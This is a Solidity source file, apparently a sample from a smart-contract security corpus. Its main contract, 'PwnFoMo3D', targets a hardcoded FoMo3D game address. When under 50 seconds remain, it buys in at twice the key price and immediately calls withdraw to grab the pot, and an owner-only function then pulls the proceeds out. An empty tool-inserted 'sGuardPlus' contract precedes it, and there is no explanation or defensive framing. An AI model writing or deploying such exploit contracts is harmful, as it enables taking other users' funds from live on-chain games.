pragma solidity ^0.4.24;

                        contract sGuardPlus {
                                constructor() internal {
                                        
                                        
                                }
                                
                                
                                
                                
                        }
                interface FoMo3DlongInterface  {
function getBuyPrice () public view returns (uint256    );
function getTimeLeft () public view returns (uint256    );
function withdraw () external  ;
}
contract Owned  {
address  public   owner;
address  public   newOwner;
event OwnershipTransferred (address  indexed  _from,address  indexed  _to);
constructor () public  {
owner=msg.sender;
}

modifier onlyOwner {
require(msg.sender==owner);
_;
}
function transferOwnership (address    _newOwner) public onlyOwner  {
newOwner=_newOwner;
}

function acceptOwnership () public  {
require(msg.sender==newOwner);
emit OwnershipTransferred(owner, newOwner);
owner=newOwner;
newOwner=address(0);
}

}
contract PwnFoMo3D is Owned {
FoMo3DlongInterface     fomo3d;
constructor () public payable {
fomo3d=FoMo3DlongInterface(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5);
}

function gotake () public  {
if (fomo3d.getTimeLeft()>50)
{
revert();
}

bool     __sent_result100 = address(fomo3d).call.value(fomo3d.getBuyPrice()*2)();
require(__sent_result100);
fomo3d.withdraw();
}

function withdrawOwner (uint256    a) public onlyOwner  {
msg.sender.transfer(a);
}

}
